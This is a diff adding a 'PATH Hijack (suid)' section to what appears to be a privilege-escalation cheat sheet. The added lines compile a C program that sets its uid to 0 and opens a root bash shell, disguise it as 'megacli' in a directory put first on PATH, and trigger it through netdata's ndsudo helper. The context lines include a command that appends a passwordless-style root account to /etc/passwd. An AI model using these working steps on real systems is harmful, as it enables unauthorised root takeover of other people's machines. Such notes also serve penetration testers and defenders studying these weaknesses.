@@ -1387,6 +1387,20 @@ CHECK_CONTENT=true sudo bash /opt/ghost/clean_symlink.sh /home/bob/.cache/x.png
 echo "any:$(openssl passwd -1 root):0:0:root:/root:/bin/bash" >> /etc/passwd && echo 'The password is: root'; su any
 
 +---------- PATH Hijack (suid) ----------+
+-->> Create Imposter Binary
+IMPOSTER_BINARY=megacli
+echo '#include <unistd.h>\n#include <stdlib.h>\nint main() {\n  setuid(0);\n  setgid(0);\n  execl("/bin/bash", "bash", "-i", NULL);\n  return 0;\n}' > x.c
+gcc x.c -o "$IMPOSTER_BINARY"
+
+-->> Create Imposter Directory for Binary
+mkdir -p ~/imposter; mv ~/"$IMPOSTER_BINARY" ~/imposter; chmod +x ~/imposter/"$IMPOSTER_BINARY"
+
+-->> Add Imposter Directory to PATH
+export PATH=~/imposter:$PATH
+
+-->> Execute Legit Binary: Imposter Will Execute
+/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo megacli-disk-info
+
 strace -f -o file /usr/local/bin/suid-name
 cat file | grep -rine 'root'
 cat file | grep -rinE 'chmod |tar '
